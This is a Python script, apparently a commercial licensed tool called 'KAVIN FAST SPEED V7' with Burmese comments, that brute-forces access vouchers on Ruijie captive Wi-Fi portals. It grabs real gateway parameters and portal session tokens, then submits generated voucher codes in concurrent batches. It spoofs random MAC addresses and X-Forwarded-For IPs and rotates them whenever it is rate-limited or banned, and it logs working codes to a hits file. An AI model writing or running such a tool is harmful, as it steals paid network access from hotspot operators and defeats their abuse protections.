# =====================================================================
# kavin_v7_real.py - KAVIN FAST SPEED V7 (REAL SESSION + REAL PLAN)
# Single file, tested flow
# =====================================================================
import os, time, random, string, json, asyncio, socket, threading, re, sys
import urllib3, requests, aiohttp
from urllib.parse import urlparse, parse_qs, quote, unquote
from rich.console import Console
from rich.text import Text
from rich.prompt import Prompt
from rich.live import Live
from rich.panel import Panel
from rich.box import ROUNDED
from rich.table import Table
from rich.align import Align
from rich.layout import Layout

try:
    import license as _license
    HAS_LICENSE_MODULE = True
except ImportError:
    HAS_LICENSE_MODULE = False
    _license = None

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

HITS_FILE = "hits.txt"
CONCURRENCY_LIMIT = 8         # >10 → Ruijie 429
TIMEOUT = 5
SESSION_TTL = 280             # Ruijie sign expire ~300s
RUIJIE_BASE = "https://portal-as.ruijienetworks.com"
RUIJIE_WIFIDOG = f"{RUIJIE_BASE}/api/auth/wifidog"
RUIJIE_VOUCHER = f"{RUIJIE_BASE}/api/auth/voucher/?lang=en_US"

console = Console()
tried_codes = set()
code_lock = threading.Lock()
LICENSE_INFO = {"status": "Unverified"}

# ---------- helpers ----------
def generate_random_mac():
    return "00:16:3e:%02x:%02x:%02x" % (
        random.randint(0, 0x7f), random.randint(0, 0xff), random.randint(0, 0xff))

def generate_random_ip():
    return f"192.168.110.{random.randint(2, 254)}"

def clear_screen():
    try: os.system('cls' if os.name == 'nt' else 'clear')
    except Exception: pass

def format_time(s):
    try:
        s = int(s); return f"{s//3600:02d}:{(s%3600)//60:02d}:{s%60:02d}"
    except: return "00:00:00"

def epoch_ms_to_plan(ms, flow_bytes=0):
    """Ruijie ရဲ့ expireTime(ms) + flow(B) ကို လူဖတ်ရင် ကောင်းတဲ့ string ပြောင်း"""
    try:
        ms = int(ms)
        if ms <= 0: return "N/A"
        now = int(time.time()*1000)
        remain_s = max(0, (ms - now)//1000)
        flow_gb = round(int(flow_bytes)/(1024**3), 2) if flow_bytes else 0
        tail = f" | {flow_gb}GB" if flow_gb else ""
        return f"{remain_s//3600}h{(remain_s%3600)//60}m{remain_s%60}s{tail}"
    except: return "N/A"

def get_gateway_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]; s.close()
        p = ip.split("."); p[-1] = "1"; return ".".join(p)
    except: return "192.168.110.1"

def check_license():
    if not HAS_LICENSE_MODULE: return False, "license.py မရှိ"
    try:
        r = _license.check_approval()
        if isinstance(r, tuple): return r
        return bool(r), "Valid" if r else "Invalid"
    except Exception as e: return False, str(e)

def activate_license(k):
    if not HAS_LICENSE_MODULE: return False, "license.py မရှိ"
    try: return _license.activate(k)
    except Exception as e: return False, str(e)

# ---------- portal detect (real gw params) ----------
def detect_and_capture():
    s = requests.Session()
    s.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"})
    probes = [
        "http://connectivitycheck.gstatic.com/generate_204",
        "http://detectportal.firefox.com/success.txt",
        "http://captive.apple.com/hotspot-detect.html",
    ]
    for probe in probes:
        try:
            r = s.get(probe, allow_redirects=True, timeout=6, verify=False)
            if "ruijienetworks" in r.url or "ruijienet" in r.text.lower():
                console.print(f"[green][+] Captured real portal: {r.url[:90]}[/green]")
                return r.url
        except Exception: continue
    for gw in dict.fromkeys([get_gateway_ip(), "192.168.110.1", "10.44.77.254", "192.168.7.1", "192.168.1.1"]):
        try:
            r = s.get(f"http://{gw}", timeout=4, allow_redirects=True)
            if "ruijienetworks" in r.url:
                console.print(f"[green][+] Captured via gateway {gw}[/green]")
                return r.url
        except Exception: pass
    return None

def build_gw_params(portal_url):
    """portal_url ကနေ **တကယ့်** gw param တွေ အားလုံး ဆွဲထုတ် (auto)"""
    p = {
        "stage": "portal",
        "gw_id": "c4b25be7d323",
        "gw_sn": "H1U320P00210A",
        "gw_address": "192.168.7.1",
        "gw_port": "2060",
        "nasip": "192.168.1.193",
        "ssid": "VLAN7",
        "slot_num": "14",
        "ustate": "0",
        "mac_req": "1",
        "chap_id": r"\245",
        "chap_challenge": r"\124\275\237\157\043\371\050\266\227\342\155\205\324\112\266\067",
        "url": RUIJIE_BASE,
    }
    if not portal_url: 
        console.print("[yellow][!] No portal captured — using defaults (may fail session)[/yellow]")
        return p
    q = parse_qs(urlparse(portal_url).query)
    for k in ("gw_id","gw_sn","gw_address","gw_port","nasip","slot_num","ssid",
              "chap_id","chap_challenge","stage","ustate","mac_req","url","gw_mac"):
        if q.get(k):
            p[k] = unquote(q[k][0])
    if q.get("gw_mac"):
        p["gw_id"] = q["gw_mac"][0]
    console.print(f"[cyan][+] Real params: gw_id={p['gw_id']} nasip={p['nasip']} ssid={p['ssid']}[/cyan]")
    return p

# ---------- real session ----------
async def fetch_real_session(session, gw_params, mac, ip):
    """Ruijie wifidog ကို **တကယ့်** request ပို့။ timestamp/sign ကို redirect ကနေ ရယူ"""
    base = RUIJIE_WIFIDOG
    if "portal-mm" in str(gw_params.get("url","")):
        base = base.replace("portal-as", "portal-mm-as")

    p = dict(gw_params); p["mac"] = mac; p["ip"] = ip
    qs = "&".join(f"{k}={quote(str(v))}" for k,v in p.items())
    url = f"{base}?{qs}"
    headers = {
        "User-Agent": f"Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36",
        "Client-Mac": mac,
        "X-Forwarded-For": ip,
        "Accept": "*/*",
    }
    try:
        async with session.get(url, headers=headers, timeout=8,
                               allow_redirects=False, ssl=False) as r:
            if r.status == 429: return ("BAN", "429")
            loc = r.headers.get("Location","")
            if not loc:
                body = await r.text()
                m = re.search(r'(https?://[^\s"\'<>]+sessionId=[^\s"\'<>]+)', body)
                if m: loc = m.group(1)
            if loc:
                ll = loc.lower()
                if any(x in ll for x in ("request limited","error.html","errormsg","banned")):
                    return ("BAN", "banned")
                q2 = parse_qs(urlparse(unquote(loc)).query)
                sid = q2.get("sessionId",[None])[0]
                if sid:
                    return ("REAL", {
                        "sessionId": sid,
                        "sign":      q2.get("sign",[None])[0],
                        "timestamp": q2.get("timestamp",[None])[0],
                        "logonUrl":  (q2.get("logonUrl",[None])[0] or ""),
                        "acquired":  time.time(),
                    })
                return ("NO_SESS", f"no sid in redirect")
            return ("NO_SESS", f"HTTP {r.status} (no redirect)")
    except asyncio.TimeoutError: return ("NET", "timeout")
    except Exception as e:   return ("NET", type(e).__name__)

# ---------- test voucher ----------
async def test_code(session, sess, code, mac, ip):
    url = RUIJIE_VOUCHER
    if sess.get("sign") and sess.get("timestamp"):
        url += f"&sign={sess['sign']}&timestamp={sess['timestamp']}"
    headers = {
        "content-type": "application/json",
        "user-agent": "Mozilla/5.0 (Linux; Android 12)",
        "referer": f"{RUIJIE_BASE}/download/static/maccauth/src/index.html?sessionId={sess['sessionId']}",
        "Client-Mac": mac,
        "X-Forwarded-For": ip,
    }
    payload = {"accessCode": code, "sessionId": sess["sessionId"], "apiVersion": 1}
    if sess.get("sign"): payload["sign"] = sess["sign"]
    if sess.get("timestamp"): payload["timestamp"] = sess["timestamp"]

    try:
        async with session.post(url, json=payload, headers=headers,
                                timeout=TIMEOUT, ssl=False, allow_redirects=True) as r:
            if r.status == 429: return "__RATE_LIMITED__", "N/A"
            text = await r.text()
            if not text: return "__NETWORK_ERROR__", "N/A"
            low = text.lower()
            if ("request limited" in low or "too many" in low or
                "request%20limited" in str(r.url).lower()):
                return "__RATE_LIMITED__", "N/A"
            if "session timed out" in low or "invalid session" in low:
                return "__SESSION_EXPIRED__", "N/A"

            real_plan = "N/A"; is_hit = False
            try:
                j = json.loads(text)
                if j.get("success") is True or j.get("code") == 200:
                    is_hit = True
                    rd = j.get("result", {})
                    if isinstance(rd, dict):
                        exp = rd.get("expireTime") or rd.get("expire_time") or rd.get("deadline")
                        flow = rd.get("flow") or rd.get("bytes") or 0
                        if exp: real_plan = epoch_ms_to_plan(exp, flow)
                        elif rd.get("duration"): real_plan = f"{rd['duration']}s"
                        elif rd.get("name"):     real_plan = str(rd["name"])
                        if not rd.get("logonUrl"):
                            for kk in ("plan","package","profile"):
                                if rd.get(kk): real_plan = str(rd[kk]); break
            except Exception:
                if '"success":true' in low or "congratulations" in low: is_hit = True

            return ("HIT" if is_hit else text), real_plan
    except asyncio.TimeoutError: return "__TIMEOUT__", "N/A"
    except aiohttp.ClientError: return "__NETWORK_ERROR__", "N/A"
    except Exception as e: return f"__ERROR__:{type(e).__name__}", "N/A"

# ---------- code gen ----------
_CHARSETS = {
    "num": string.digits,
    "eng": string.ascii_lowercase,
    "mix": string.ascii_lowercase + string.digits,
}
seq_counter = 1
seq_lock = threading.Lock()

def gen_code(mode, length, scan_method="random"):
    chars = _CHARSETS.get(mode)
    if not chars: return ""
    global seq_counter
    if scan_method == "sequential":
        with seq_lock:
            n = seq_counter; seq_counter += 1
        base = len(chars); out = []
        for _ in range(length):
            out.append(chars[n % base]); n //= base
        return "".join(reversed(out))
    with code_lock:
        while True:
            c = "".join(random.choices(chars, k=length))
            if c not in tried_codes:
                tried_codes.add(c); return c

# ---------- dashboard ----------
def render_dash(mode_str, scan_method, cur_code, tested, elapsed, status, hits,
                speed, mac, ip, sess_stat, sess_id, total):
    progress = min(100.0, (tested/total)*100) if total else 0.0
    header = Text("⚡ KAVIN FAST SPEED V7 ⚡", style="bold bright_cyan", justify="center")

    stat_style = "bold red" if any(x in status.upper() for x in ("ERR","TIMEOUT","BAN")) else "bold green"
    sess_style = {"REAL":"bold green","FAKE":"bold yellow","EXPIRED":"bold red","BANNED":"bold red"}.get(sess_stat,"bold cyan")
    sess_txt = f"{sess_stat} ({(sess_id or '')[:8]})" if sess_id else sess_stat

    tbl = Table.grid(expand=True, padding=(0,1))
    for _ in range(4): tbl.add_column(style="bold white", justify="left")
    tbl.add_row("  📅 Expiry", f": {LICENSE_INFO['status']}", "  ⏱ Timer", f": {elapsed}")
    tbl.add_row("  🎯 Mode",   f": {mode_str}",             "  📊 Tested", f": {tested:,}")
    tbl.add_row("  ⚡ Speed",  f": {int(speed)} c/m",       "  📡 Status", f": {status}", style=stat_style)
    tbl.add_row("  🔑 Hits",   f": {len(hits)}",             "  📌 Engine", f": {scan_method.upper()}")
    tbl.add_row("  🖥 MAC",     f": ...{mac[-8:]}",          "  🌐 IP",     f": ...{ip[-3:]}")
    tbl.add_row("  🔐 Session",f": {sess_txt}",              "  📈 Progress", f": {progress:.2f}%", style=sess_style)

    tbl_panel = Panel(tbl, border_style="magenta", box=ROUNDED, height=9)
    code_panel = Panel(Align.center(Text(f"Check Code : {cur_code or '------'}", style="bold yellow")),
                       border_style="yellow", box=ROUNDED, height=3)

    vt = Table(show_header=True, header_style="bold bright_white", expand=True, box=ROUNDED, border_style="green")
    vt.add_column("Voucher", style="bold green", justify="center")
        vt.add_column("Real Plan (သက်တမ်း)", style="bold green", justify="center")
    vt.add_column("Time", style="bold cyan", justify="center")

    for h in hits[-15:]:   # နောက်ဆုံး 15 ခုပဲ ပြ
        vt.add_row(h.get('code',''), h.get('plan','N/A'), h.get('time',''))
    if not hits: vt.add_row("—","—","—")

    footer = Panel(Align.center(Text("✨ Thank You @khant7997 ✨", style="bold bright_yellow")),
                   border_style="red", box=ROUNDED, height=3)

    body = Layout()
    body.split_column(
        Layout(tbl_panel, size=9),
        Layout(code_panel, size=3),
        Layout(vt, ratio=1),
        Layout(footer, size=3),
    )
    root = Layout()
    root.split_column(
        Layout(Panel(Align.center(header), border_style="cyan", box=ROUNDED), size=3),
        Layout(body, ratio=1),
    )
    return root

# ---------- scan loop ----------
async def scan_loop_async(mode, length, scan_method, gw_params):
    global seq_counter, tried_codes
    tried_codes.clear()
    seq_counter = 1

    total_target = {"num": 10**length, "eng": 26**length, "mix": 36**length}.get(mode, 1000000)
    mode_str = f"{mode.upper()}-{length}"

    hits = []
    tested = 0
    start = time.time()

    cur_code = ""
    status = "Init"
    sess_stat = "NONE"
    sess_id = "--------"
    mac = generate_random_mac()
    ip  = generate_random_ip()
    sess = None
    sess_time = 0.0

    sem = asyncio.Semaphore(CONCURRENCY_LIMIT)
    conn = aiohttp.TCPConnector(limit=50, ssl=False, force_close=False)

    async with aiohttp.ClientSession(connector=conn) as session:
        live = Live(
            render_dash(mode_str, scan_method, cur_code, tested, "00:00:00",
                        status, hits, 0.0, mac, ip, sess_stat, sess_id, total_target),
            refresh_per_second=8,
            console=console,
        )
        live.start(refresh=True)

        try:
            while True:
                # ---- session renewal every SESSION_TTL seconds or on demand ----
                if sess is None or (time.time() - sess_time) > SESSION_TTL:
                    status = "Fetching session…"
                    live.update(render_dash(mode_str, scan_method, cur_code, tested,
                        format_time(time.time()-start), status, hits,
                        (tested/max(1,time.time()-start))*60, mac, ip, "GET…", "--------", total_target))

                    tag, payload = await fetch_real_session(session, gw_params, mac, ip)
                    if tag == "REAL":
                        sess = payload
                        sess_stat = "REAL"
                        sess_id = sess["sessionId"]
                        sess_time = time.time()
                        status = "Active"
                    elif tag == "BAN":
                        mac = generate_random_mac()
                        ip  = generate_random_ip()
                        sess_stat = "BANNED"
                        sess = None
                        status = "Rotating…"
                        await asyncio.sleep(3)
                        continue
                    else:  # NET / NO_SESS
                        sess_stat = f"FAIL({payload})"
                        sess = None
                        status = f"Session fail: {payload}"
                        await asyncio.sleep(2)
                        continue

                # ---- build batch ----
                batch = []
                guard = 0
                while len(batch) < CONCURRENCY_LIMIT and guard < 1000:
                    guard += 1
                    c = gen_code(mode, length, scan_method)
                    if c and c not in batch:
                        batch.append(c)
                if not batch:
                    await asyncio.sleep(0.05); continue

                # ---- fire batch ----
                async def _run(code):
                    async with sem:
                        return await test_code(session, sess, code, mac, ip)

                results = await asyncio.gather(*[_run(c) for c in batch],
                                               return_exceptions=True)

                refresh_session = False
                for idx, r in enumerate(results):
                    tested += 1
                    code = batch[idx]
                    cur_code = code

                    if isinstance(r, Exception):
                        continue
                    res, plan = r

                    if res == "__SESSION_EXPIRED__":
                        refresh_session = True; sess_stat = "EXPIRED"; break
                    if res == "__RATE_LIMITED__":
                        mac = generate_random_mac(); ip = generate_random_ip()
                        refresh_session = True; sess_stat = "BANNED"; status = "429 → rotate"
                        await asyncio.sleep(2); break
                    if res.startswith("__") :
                        continue

                    if res == "HIT":
                        ts = time.strftime("%H:%M:%S")
                        hits.append({"code": code, "plan": plan, "time": ts})
                        try:
                            with open(HITS_FILE, "a", encoding="utf-8") as f:
                                f.write(f"[{ts}] {code} | {plan}\n")
                        except Exception: pass
                        # hit ပြီးတိုင်း session renew (Ruijie one-shot)
                        refresh_session = True
                        sess_stat = "HIT"
                        break

                if refresh_session:
                    sess = None
                    sess_time = 0.0

                elapsed = time.time() - start
                speed = (tested / elapsed * 60) if elapsed > 0 else 0.0
                live.update(render_dash(mode_str, scan_method, cur_code, tested,
                    format_time(elapsed), status, hits, speed, mac, ip,
                    sess_stat, sess_id, total_target))

        except (KeyboardInterrupt, asyncio.CancelledError):
            status = "Stopped"
        finally:
            live.stop()

        console.print(Panel(
            Align.center(Text(f"✅ Done • Tested {tested:,} • Hits {len(hits)}",
                              style="bold bright_green")),
            border_style="green", box=ROUNDED))

# ---------- menus ----------
def show_banner():
    clear_screen()
    console.print()
    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
    console.print(Text("⚡ KAVIN FAST SPEED V7 ⚡", style="bold bright_white"), justify="center")
    console.print(Text("══════════════════════════════════════", style="bold bright_cyan"), justify="center")
    console.print()

def ask_mode():
    while True:
        show_banner()
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🔢  Number   (0-9)")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 🔤  Alphabet (a-z)")
        console.print("  [bold bright_cyan]3.[/bold bright_cyan] 🔀  Mixed    (a-z0-9)")
        console.print("  [bold bright_red]0.[/bold bright_red] ❌  Exit\n")
        c = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if c == "0": return None
        if c in ("1","2","3"): return {"1":"num","2":"eng","3":"mix"}[c]

def ask_length(mode):
    while True:
        show_banner()
        console.print(f"  [bold bright_white]Mode {mode.upper()} — Length[/bold bright_white]\n")
        for i, L in enumerate((4,5,6,7,8,9), 1):
            console.print(f"  [bold bright_cyan]{i}.[/bold bright_cyan] {L} chars")
        console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
        c = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if c == "0": return None
        if c in [str(i) for i in range(1,7)]:
            return (4,5,6,7,8,9)[int(c)-1]

def ask_scan():
    while True:
        show_banner()
        console.print("  [bold bright_cyan]1.[/bold bright_cyan] 🎲  Random")
        console.print("  [bold bright_cyan]2.[/bold bright_cyan] 📈  Sequential\n")
        console.print("  [bold bright_red]0.[/bold bright_red] ↩ Back\n")
        c = Prompt.ask("  [bright_cyan]➜ Select[/bright_cyan]").strip()
        if c == "0": return None
        if c in ("1","2"): return {"1":"random","2":"sequential"}[c]

# ---------- main ----------
def run():
    global LICENSE_INFO
    show_banner()

    ok, msg = check_license()
    while not ok:
        clear_screen()
        console.print(Panel(Align.center(Text("🔐 Enter License Key", style="bold yellow")),
                            border_style="yellow"))
        k = Prompt.ask("  ➜ Key").strip()
        if k:
            ok2, m2 = activate_license(k)
            console.print(Panel(Align.center(Text(m2, style="bold green" if ok2 else "bold red")),
                                border_style="green" if ok2 else "red"))
            time.sleep(2)
            ok, msg = check_license()
        else:
            time.sleep(1)
    LICENSE_INFO["status"] = msg

    portal_url = detect_and_capture()
    gw_params = build_gw_params(portal_url)

    while True:
        mode = ask_mode()
        if mode is None: break
        length = ask_length(mode)
        if length is None: continue
        scan_m = ask_scan()
        if scan_m is None: continue

        try:
            asyncio.run(scan_loop_async(mode, length, scan_m, gw_params))
        except KeyboardInterrupt:
            pass
        except Exception as e:
            console.print(f"[bold red]Error: {e}[/bold red]")
            time.sleep(2)
        # user ဆက်ရွေးလို့ ရအောင် loop မှာ ပြန်မေး

def main():
    try: run()
    except (KeyboardInterrupt, EOFError):
        console.print("\n[bold red]Exiting...[/bold red]")
    finally:
        try:
            console.print()
            console.print(Text("✨ @khant7997 Tools ✨", style="bold bright_green"), justify="center")
        except Exception: pass
        time.sleep(1)

if __name__ == "__main__":
    main()